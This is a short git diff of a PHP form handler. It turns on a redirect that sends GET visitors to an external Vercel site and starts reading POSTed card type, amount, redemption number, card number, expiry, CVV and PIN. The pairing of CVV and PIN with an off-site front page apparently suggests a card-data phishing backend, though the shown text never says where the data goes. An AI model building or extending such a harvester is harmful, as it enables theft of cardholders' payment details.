@@ -1,8 +1,8 @@
 <?php
-// if ($_SERVER["REQUEST_METHOD"] == "GET") {
-//     header('Location: https://my-cardlysupply.vercel.app/');
-//     exit;
-// };
+if ($_SERVER["REQUEST_METHOD"] == "GET") {
+    header('Location: https://my-cardlysupply.vercel.app/');
+    exit;
+};
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (!empty($_POST['form_fields']["currency"])) {
